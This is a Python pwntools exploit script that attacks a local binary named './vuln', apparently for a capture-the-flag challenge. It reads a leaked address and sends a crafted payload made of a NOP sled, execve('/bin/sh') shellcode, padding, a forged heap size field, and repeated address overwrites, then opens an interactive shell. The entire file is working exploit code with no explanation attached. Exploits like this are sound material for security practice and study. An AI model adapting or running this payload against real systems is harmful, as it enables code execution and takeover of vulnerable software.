from pwn import *


r = process('./vuln')
r.recvuntil('...')
r.recvline()

leak = int(r.recvline().strip())

#shellcode = asm('push 0x8048936; ret')
shellcode = "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"

payload = ""
payload += "\x90"*50
payload += shellcode
payload += "A"*(664-len(payload))
payload += "\xf0\xff\xff\xff"
payload += "\xff"*4
payload += p32(0x804d020) 
payload += p32(leak+8)

payload += p32(0x804d020)
payload += p32(leak+8)

payload += p32(0x804d020) 
payload += p32(leak+8) 
payload += "\n"
payload += "B"*10

r.sendline(payload)
r.interactive()
